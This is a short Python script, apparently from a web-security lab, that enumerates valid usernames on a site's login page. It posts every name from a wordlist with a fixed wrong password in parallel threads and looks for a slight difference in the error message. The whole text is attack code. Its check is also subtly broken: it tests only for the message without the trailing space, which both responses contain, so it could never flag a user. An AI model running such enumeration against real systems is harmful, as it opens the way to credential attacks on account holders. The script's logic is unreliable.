python3 - <<'EOF'
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "[URL]"

with open("C:/Users/malik/Downloads/usernames.txt") as f:
    usernames = [line.strip() for line in f]

def check(username):
    r = requests.post(
        f"{base_url}/login",
        data={"username": username, "password": "wrongpass"},
        allow_redirects=False
    )
    # The subtle difference: invalid users get "Invalid username or password."
    # Valid users get "Invalid username or password. " (trailing space)
    if "Invalid username or password." not in r.text:
        return f"[FOUND] {username}"
    return None

with ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(check, u): u for u in usernames}
    for f in as_completed(futures):
        result = f.result()
        if result:
            print(result)
EOF
